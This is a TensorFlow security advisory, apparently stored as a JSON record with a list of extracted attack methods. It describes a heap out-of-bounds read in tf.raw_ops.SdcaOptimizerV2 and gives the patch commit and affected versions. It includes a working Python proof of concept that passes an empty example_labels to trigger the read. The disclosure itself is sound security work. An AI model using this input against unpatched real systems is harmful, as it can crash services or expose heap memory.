{"description": "### Impact\nAn attacker can read from outside of bounds of heap allocated data by sending specially crafted illegal arguments to `tf.raw_ops.SdcaOptimizerV2`:\n\n```python\nimport tensorflow as tf\n  \ntf.raw_ops.SdcaOptimizerV2(\n  sparse_example_indices=[[1]],\n  sparse_feature_indices=[[1]],\n  sparse_feature_values=[[1.0,2.0]],\n  dense_features=[[1.0]],\n  example_weights=[1.0],\n  example_labels=[],\n  sparse_indices=[1],\n  sparse_weights=[1.0],\n  dense_weights=[[1.0]],\n  example_state_data=[[100.0,100.0,100.0,100.0]],\n  loss_type='logistic_loss',\n  l1=100.0,\n  l2=100.0,\n  num_loss_partitions=1,\n  num_inner_iterations=1,\n  adaptive=True)       \n``` \n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/460e000de3a83278fb00b61a16d161b1964f15f4/tensorflow/core/kernels/sdca_internal.cc#L320-L353) does not check that the length of `example_labels` is the same as the number of examples.\n\n### Patches\nWe have patched the issue in GitHub commit [a4e138660270e7599793fa438cd7b2fc2ce215a6](https://github.com/tensorflow/tensorflow/commit/a4e138660270e7599793fa438cd7b2fc2ce215a6).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.", "methods": ["Heap OOB (Out of Bounds) in `SdcaOptimizerV2` function.", "Sending specially crafted illegal arguments to `tf.raw_ops.SdcaOptimizerV2`.", "Lack of bounds checking on `example_labels` length."]}
